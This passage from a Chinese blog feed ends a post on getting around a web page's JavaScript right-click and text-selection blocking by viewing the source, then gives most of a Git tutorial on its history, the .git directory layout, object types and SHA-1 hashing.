class="string">"http://www.beian.miit.gov.cn/"</span> <span class="attr">style</span>=<span class="string">'text-decoration:none;color:#939393;'</span>&gt;</span>渝ICP备17014860号-2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">target</span>=<span class="string">"_blank"</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">style</span>=<span class="string">"display:inline-block;text-decoration:none;height:20px;line-height:20px;"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.xuexianswer.com/beian/logo.png"</span> <span class="attr">style</span>=<span class="string">"float:left;"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"float:left;height:20px;line-height:20px;margin: 0px 0px 0px 5px; color:#939393;"</span>&gt;</span>渝公网安备 50011402500333号<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">span</span> <span class="attr">align</span>=<span class="string">"right"</span> <span class="attr">style</span>=<span class="string">"display:inline-block;float:right;color:#303030;text-decoration:none;"</span>&gt;</span>友情链接： <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.xuexianswer.com/"</span> <span class="attr">style</span>=<span class="string">"color:#303030;text-decoration:none;"</span>&gt;</span>萌面人资料铺<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&amp;nbsp; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.mengmianren.com/"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">style</span>=<span class="string">"color:#303030;text-decoration:none;"</span>&gt;</span>萌面人网<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&amp;nbsp; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://mengmianren.cc/"</span> <span class="attr">style</span>=<span class="string">"color:#303030;text-decoration:none;"</span>&gt;</span>萌面人CC网<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&amp;nbsp; <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://mengmianren.pro/"</span> <span class="attr">style</span>=<span class="string">"color:#303030;text-decoration:none;"</span>&gt;</span>萌面人PRO网<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"imagetoolbar"</span> <span class="attr">content</span>=<span class="string">"no"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.oncontextmenu = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.onselectstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (event.srcElement.type != <span class="string">"text"</span> &amp;&amp; event.srcElement.type != <span class="string">"textarea"</span> &amp;&amp; event.srcElement.type != <span class="string">"password"</span>) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="built_in">window</span>.sidebar) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onmousedown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> obj = e.target;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (obj.tagName.toUpperCase() == <span class="string">'SELECT'</span> ||</span></span><br><span class="line"><span class="javascript">          obj.tagName.toUpperCase() == <span class="string">"INPUT"</span> ||</span></span><br><span class="line"><span class="javascript">          obj.tagName.toUpperCase() == <span class="string">"TEXTAREA"</span> ||</span></span><br><span class="line"><span class="javascript">          obj.tagName.toUpperCase() == <span class="string">"PASSWORD"</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">      &#125;;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.ondragstart = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> pvcArgsFrontend = &#123;</span></span><br><span class="line"><span class="javascript">      <span class="string">"mode"</span>: <span class="string">"ajax"</span>,</span></span><br><span class="line"><span class="javascript">      <span class="string">"requestURL"</span>: <span class="string">"http:\/\/www.gebidemengmianren.com\/wp-content\/plugins\/post-views-counter\/includes\/ajax.php"</span>,</span></span><br><span class="line"><span class="javascript">      <span class="string">"postID"</span>: <span class="string">"198"</span>,</span></span><br><span class="line"><span class="javascript">      <span class="string">"nonce"</span>: <span class="string">"8b28046242"</span></span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-content/plugins/post-views-counter/js/frontend.js?ver=1.3.1'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-content/plugins/bj-lazy-load/js/bj-lazy-load.min.js?ver=2'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">'text/javascript'</span> <span class="attr">src</span>=<span class="string">'http://www.gebidemengmianren.com/wp-includes/js/wp-embed.min.js?ver=6f0a90e1258fc95d5c87f731d5ec4784'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><h2 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h2></li></ul><p>查看源码的一个简单方法：</p><p>在浏览器的地址栏输入以下东西，即可查看源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:url</span><br></pre></td></tr></table></figure><p>假如是通过js禁用的话，可以在控制台下输入</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.oncontextmenu=<span class="string">"return true"</span>;</span><br><span class="line"><span class="comment">//右键菜单</span></span><br><span class="line"><span class="built_in">document</span>.body.onselectstart=<span class="string">"return true"</span>;</span><br><span class="line"><span class="comment">//文本选择</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git</title>
      <link href="/2019/09/23/git/"/>
      <url>/2019/09/23/git/</url>
      
        <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a><center>Git</center></h1><blockquote><p>引用：</p><p><a href="https://blog.csdn.net/tgbus18990140382/article/details/52886786" target="_blank" rel="noopener">Git详细使用教程</a></p><p><a href="https://www.liaoxuefeng.com/wiki/896043488029600" target="_blank" rel="noopener">Git教程</a></p><p><a href="https://blog.csdn.net/yufeng1108/article/details/80619547" target="_blank" rel="noopener">Git本地服务器搭建及使用方法</a></p><p><a href="https://www.wmyskxz.com/2019/08/16/git-yuan-li-ru-men-jian-xi/" target="_blank" rel="noopener">Git原理入门解析</a></p><p><a href="https://coding.net/help/doc/practice/git-principle.html" target="_blank" rel="noopener">使用原理视角看Git</a></p></blockquote><hr><blockquote><p> <strong>Git 的诞生：</strong></p><p>很多人都知道，Linus 在 1991 年创建了开源的 Linux，从此，Linux 系统不断发展，已经成为最大的服务器系统软件了。</p><p>Linus 虽然创建了 Linux，但 Linux 的壮大是靠全世界热心的志愿者参与的，这么多人在世界各地为 Linux 编写代码，那 Linux 的代码是如何管理的呢？</p><p>事实是，在 2002 年以前，世界各地的志愿者把源代码文件通过 diff 的方式发给 Linus，然后由 Linus 本人通过手工方式合并代码！</p><p>你也许会想，为什么 Linus 不把 Linux 代码放到版本控制系统里呢？不是有 CVS、SVN 这些免费的版本控制系统吗？因为 Linus 坚定地反对 CVS 和 SVN，这些集中式的版本控制系统不但速度慢，而且必须联网才能使用。有一些商用的版本控制系统，虽然比 CVS、SVN 好用，但那是付费的，和 Linux 的开源精神不符。</p><p>不过，到了 2002 年，Linux 系统已经发展了十年了，代码库之大让 Linus 很难继续通过手工方式管理了，社区的弟兄们也对这种方式表达了强烈不满，于是 Linus 选择了一个商业的版本控制系统 BitKeeper，BitKeeper 的东家 BitMover 公司出于人道主义精神，授权 Linux 社区免费使用这个版本控制系统。</p><p>安定团结的大好局面在 2005 年就被打破了，原因是 Linux 社区牛人聚集，不免沾染了一些梁山好汉的江湖习气。开发 Samba 的 Andrew 试图破解 BitKeeper 的协议（这么干的其实也不只他一个），被 BitMover 公司发现了（监控工作做得不错！），于是 BitMover 公司怒了，要收回 Linux 社区的免费使用权。</p><p>Linus 可以向 BitMover 公司道个歉，保证以后严格管教弟兄们，嗯，这是不可能的。实际情况是：Linus 花了两周时间自己用 C 写了一个分布式版本控制系统，这就是 Git！一个月之内，Linux 系统的源码已经由 Git 管理了！牛是怎么定义的呢？大家可以体会一下。</p><p>Git 迅速成为最流行的分布式版本控制系统，尤其是 2008 年，GitHub 网站上线了，它为开源项目免费提供 Git 存储，无数开源项目开始迁移至 GitHub，包括 jQuery，PHP，Ruby 等等。</p><p>历史就是这么偶然，如果不是当年 BitMover 公司威胁 Linux 社区，可能现在我们就没有免费而超级好用的 Git 了。</p></blockquote><h2 id="Git是什么"><a href="#Git是什么" class="headerlink" title="Git是什么"></a>Git是什么</h2><p>Git是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。<br>Git是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。<br>Git与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p><p>先说集中式版本控制系统，版本库是集中存放在中央服务器的，而干活的时候，用的都是自己的电脑，所以要先从中央服务器取得最新的版本，然后开始干活，干完活了，再把自己的活推送给中央服务器。中央服务器就好比是一个图书馆，你要改一本书，必须先从图书馆借出来，然后回到家自己改，改完了，再放回图书馆。</p><p>那分布式版本控制系统与集中式版本控制系统有何不同呢？首先，<strong>分布式版本控制系统根本没有 “中央服务器”，每个人的电脑上都是一个完整的版本库，</strong>这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件 A，你的同事也在他的电脑上改了文件 A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。集中式版本控制系统最大的毛病就是必须联网才能工作。</p><p><img src="/2019/09/23/git/git_1.png" alt></p><p><img src="/2019/09/23/git/git_2.png" alt></p><blockquote><p><strong>Git与SVN的区别</strong><br>GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。<br>Git 与 SVN 区别点：</p><ol><li>GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。</li><li>2.GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。</li><li>GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。</li><li>GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。</li><li>GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。</li></ol></blockquote><h2 id="Git原理"><a href="#Git原理" class="headerlink" title="Git原理"></a>Git原理</h2><p>详细图文解释可参考此篇文章<a href="https://coding.net/help/doc/practice/git-principle.html" target="_blank" rel="noopener">使用原理视角看Git</a>，里面详细用图文解释了git的版本控制原理</p><p>git的工作流程大概如下：</p><ol><li>克隆 Git 资源作为工作目录。</li><li>在克隆的资源上添加或修改文件。</li><li>如果其他人修改了，你可以更新资源。</li><li>在提交前查看修改。</li><li>提交修改。</li><li>在修改完成后，如果发现错误，可以撤回提交并再次修改并提交。</li></ol><p><img src="/2019/09/23/git/git_3.png" alt></p><p>基本概念<br>我们先来理解下Git 工作区、暂存区和版本库概念</p><ul><li><p>工作区：就是你项目的目录（可见目录）。</p></li><li><p>缓存区：英文叫stage, 或index。一般存放在”git目录”下的index文件（.git/index）中，所以我们把暂存区有时也叫作索引（index）。</p></li><li><p>版本库：工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。</p></li></ul><p>下面这个图展示了工作区、版本库中的暂存区和版本库之间的关系：</p><p><img src="/2019/09/23/git/git_4.png" alt></p><p>如果我们要对项目进行管理，就切换到该项目目录底下，使用<code>git init</code>命令，进行初始化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> init</span><br></pre></td></tr></table></figure><p><code>git init</code> 命令只会做一件事，就是在项目的根目录下创建一个 <code>.git</code> 的子目录，用来保存当前项目的一些版本信息，我们可以继续使用 <code>tree -a</code> 命令查看该目录的完整结构，如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tree</span> -a</span><br><span class="line">.</span><br><span class="line">└── .git</span><br><span class="line">    ├── HEAD                                      </span><br><span class="line">    ├── branches</span><br><span class="line">    ├── config</span><br><span class="line">    ├── description</span><br><span class="line">    ├── hooks</span><br><span class="line">    │   ├── applypatch-msg.sample</span><br><span class="line">    │   ├── commit-msg.sample</span><br><span class="line">    │   ├── fsmonitor-watchman.sample</span><br><span class="line">    │   ├── post-update.sample</span><br><span class="line">    │   ├── pre-applypatch.sample</span><br><span class="line">    │   ├── pre-commit.sample</span><br><span class="line">    │   ├── pre-push.sample</span><br><span class="line">    │   ├── pre-rebase.sample</span><br><span class="line">    │   ├── pre-receive.sample</span><br><span class="line">    │   ├── prepare-commit-msg.sample</span><br><span class="line">    │   └── update.sample</span><br><span class="line">    ├── index</span><br><span class="line">    ├── info</span><br><span class="line">    │   └── exclude</span><br><span class="line">    ├── objects</span><br><span class="line">    │   ├── .DS_Store</span><br><span class="line">    │   ├── info</span><br><span class="line">    │   └── pack</span><br><span class="line">    └── refs</span><br><span class="line">        ├── heads</span><br><span class="line">        └── tags</span><br></pre></td></tr></table></figure><h3 id="Git目录解析"><a href="#Git目录解析" class="headerlink" title="Git目录解析"></a>Git目录解析</h3><h4 id="config-目录"><a href="#config-目录" class="headerlink" title="config 目录"></a>config 目录</h4><p>config 是仓库的配置文件，一个典型的配置文件如下，我们创建的远端，分支都在等信息都在配置文件里有表现；<code>fetch</code> 操作的行为也是在这里配置的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">    repositoryformatversion = 0</span><br><span class="line">    filemode = false</span><br><span class="line">    bare = false</span><br><span class="line">    logallrefupdates = true</span><br><span class="line">    symlinks = false</span><br><span class="line">    ignorecase = true</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">    url = git@github.com:yanhaijing/zepto.fullpage.git</span><br><span class="line">    fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;master&quot;]</span><br><span class="line">    remote = origin</span><br><span class="line">    merge = refs/heads/master</span><br><span class="line">[branch &quot;dev&quot;]</span><br><span class="line">    remote = origin</span><br><span class="line">    merge = refs/heads/dev</span><br></pre></td></tr></table></figure><h4 id="objects-目录"><a href="#objects-目录" class="headerlink" title="objects 目录"></a>objects 目录</h4><p>Git 可以通过一种算法可以得到任意文件的 <strong>“指纹”</strong>（40 位 16 进制数字），然后通过文件指纹存取数据，存取的数据都位于 objects 目录。</p><p>例如我们可以手动创建一个测试文本文件并使用 <code>git add .</code> 命令来观察 <code>.git</code> 文件夹出现的变化：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ touch test.txt</span><br><span class="line">$ git add .</span><br></pre></td></tr></table></figure><p><code>git add .</code> 命令就是用于把当前新增的变化添加进 Git 本地仓库的，在我们使用后，我们惊奇的发现 <code>.git</code> 目录下的 <code>objects/</code> 目录下多了一个目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ tree -a</span><br><span class="line">.</span><br><span class="line">├── .git</span><br><span class="line">│   ├── HEAD</span><br><span class="line">│   ├── branches</span><br><span class="line">│   ├── config</span><br><span class="line">│   ├── description</span><br><span class="line">│   ├── hooks</span><br><span class="line">│   │   ├── 节省篇幅..省略..</span><br><span class="line">│   ├── index</span><br><span class="line">│   ├── info</span><br><span class="line">│   │   └── exclude</span><br><span class="line">│   ├── objects</span><br><span class="line">│   │   ├── .DS_Store</span><br><span class="line">│   │   ├── e6</span><br><span class="line">│   │   │   └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br><span class="line">│   │   ├── info</span><br><span class="line">│   │   └── pack</span><br><span class="line">│   └── refs</span><br><span class="line">│       ├── heads</span><br><span class="line">│       └── tags</span><br><span class="line">└── test.txt</span><br></pre></td></tr></table></figure><p>我们可以使用 <code>git hash-object test.txt</code> 命令来看看刚才我们创建的 <code>test.txt</code> 的 “文件指纹”：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">hash</span>-object test.txt</span><br><span class="line">e69de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br></pre></td></tr></table></figure><p>这时候我们可以发现，新创建的目录 <code>e6</code> 其实是该文件哈希值的前两位，这其实是 Git 做的一层类似于索引一样的东西，并且默认采用 16 进制的两位数来当索引，是非常合适的。</p><p>这边其实引入了Sha-1算法</p><p>SHA-1将文件中的内容通过通过计算生成一个 40 位长度的hash值。</p><p>Sha-1的非常有特点：</p><ul><li>由文件内容计算出的hash值</li><li>hash值相同，文件内容相同</li></ul><p>对于添加的内容，无论我们执行多少次，都会得到相同的结果。因此，文件的sha-1值是可以作为文件的唯一 id 。同时，它还有一个额外的功能，校验文件完整性。</p><p><strong>objects 目录下有 3 种类型的数据：</strong></p><ul><li>Blob；</li><li>Tree;</li><li>Commit；</li></ul><p>文件都被存储为 blob 类型的文件，文件夹被存储为 tree 类型的文件，创建的提交节点被存储为 Commit 类型的数据；</p><p>一般我们系统中的目录(tree)，在 Git 会像下面这样存储：</p><p><img src="/2019/09/23/git/git_5.png" alt></p><p>而 Commit 类型的数据则整合了 tree 和 blob 类型，保存了当前的所有变化，例如我们可以再在刚才的目录下新建一个目录，并添加一些文件试试：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir <span class="built_in">test</span></span><br><span class="line">$ touch <span class="built_in">test</span>/test.file</span><br><span class="line">$ tree -a</span><br><span class="line">.</span><br><span class="line">├── .git</span><br><span class="line">│   ├── HEAD</span><br><span class="line">│   ├── branches</span><br><span class="line">│   ├── config</span><br><span class="line">│   ├── description</span><br><span class="line">│   ├── hooks</span><br><span class="line">│   │   ├── 节省篇幅..省略..</span><br><span class="line">│   ├── index</span><br><span class="line">│   ├── info</span><br><span class="line">│   │   └── exclude</span><br><span class="line">│   ├── objects</span><br><span class="line">│   │   ├── .DS_Store</span><br><span class="line">│   │   ├── e6</span><br><span class="line">│   │   │   └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br><span class="line">│   │   ├── info</span><br><span class="line">│   │   └── pack</span><br><span class="line">│   └── refs</span><br><span class="line">│       ├── heads</span><br><span class="line">│       └── tags</span><br><span class="line">├── <span class="built_in">test</span></span><br><span class="line">│   └── test.file</span><br><span class="line">└── test.txt</span><br></pre></td></tr></table></figure><p>提交完Commit在观察变化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -a -m <span class="string">"test: 新增测试文件夹和测试文件观察.git文件的变化"</span></span><br><span class="line">[master (root-commit) 30d51b1] <span class="built_in">test</span>: 新增测试文件夹和测试文件观察.git文件的变化</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 test.txt</span><br><span class="line">$ tree -a</span><br><span class="line">.</span><br><span class="line">├── .git</span><br><span class="line">│   ├── COMMIT_EDITMSG</span><br><span class="line">│   ├── HEAD</span><br><span class="line">│   ├── branches</span><br><span class="line">│   ├── config</span><br><span class="line">│   ├── description</span><br><span class="line">│   ├── hooks</span><br><span class="line">│   │   ├── ...省略...</span><br><span class="line">│   ├── index</span><br><span class="line">│   ├── info</span><br><span class="line">│   │   └── exclude</span><br><span class="line">│   ├── logs</span><br><span class="line">│   │   ├── HEAD</span><br><span class="line">│   │   └── refs</span><br><span class="line">│   │       └── heads</span><br><span class="line">│   │           └── master</span><br><span class="line">│   ├── objects</span><br><span class="line">│   │   ├── .DS_Store</span><br><span class="line">│   │   ├── 30</span><br><span class="line">│   │   │   └── d51b1edd2efd551dd6bd52d4520487b5708c0e</span><br><span class="line">│   │   ├── 5e</span><br><span class="line">│   │   │   └── fb9bc29c482e023e40e0a2b3b7e49cec842034</span><br><span class="line">│   │   ├── e6</span><br><span class="line">│   │   │   └── 9de29bb2d1d6434b8b29ae775ad8c2e48c5391</span><br><span class="line">│   │   ├── info</span><br><span class="line">│   │   └── pack</span><br><span class="line">│   └── refs</span><br><span class="line">│       ├── heads</span><br><span class="line">│       │   └── master</span><br><span class="line">│       └── tags</span><br><span class="line">├── <span class="built_in">test</span></span><br><span class="line">│   └── test.file</span><br><span class="line">└── test.txt</span><br></pre></td></tr></table></figure><p>首先我们可以观察到我们提交了一个 Commit 的时候在第一句话里面返回了一个短的像是哈希值一样的东西： <code>[master (root-commit) 30d51b1]</code> 中 的 <code>30d51b1</code>，对应的我们也可以在 objects 找到刚才 commit 的对象，我们可以使用 <code>git cat-file -p</code> 命令输出一下当前文件的内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git cat-file -p 30d5</span><br><span class="line">tree 5efb9bc29c482e023e40e0a2b3b7e49cec842034</span><br><span class="line">author 我没有三颗心脏  1565742122 +0800</span><br><span class="line">committer 我没有三颗心脏  1565742122 +0800</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>: 新增测试文件夹和测试文件观察.git文件的变化</span><br></pre></td></tr></table></figure><p>我们发现这里面有提交的内容信息、作者信息、提交者信息以及 commit message，当然我们可以进一步看到提交的内容具体有哪些：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git cat-file -p 5efb</span><br><span class="line">100644 blob e69de29bb2d1d6434b8b29ae775ad8c2e48c5391    test.txt</span><br></pre></td></tr></table></figure><p>我们再试着提交一个 commit 来观察变化:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ touch <span class="built_in">test</span>/test2.file</span><br><span class="line">$  git commit -a -m <span class="string">"test: 新增加一个 commit 以观察变化."</span></span><br><span class="line">[master 9dfabac] <span class="built_in">test</span>: 新增加一个 commit 以观察变化.</span><br><span class="line"> 2 files changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 <span class="built_in">test</span>/test.file</span><br><span class="line"> create mode 100644 <span class="built_in">test</span>/test2.file</span><br><span class="line">$ git cat-file -p 9dfabac</span><br><span class="line">tree c562bfb9441352f4c218b0028148289f1ea7d7cd</span><br><span class="line">parent 30d51b1edd2efd551dd6bd52d4520487b5708c0e</span><br><span class="line">author 龙滔  1565878699 +0800</span><br><span class="line">committer 龙滔  1565878699 +0800</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>: 新增加一个 commit 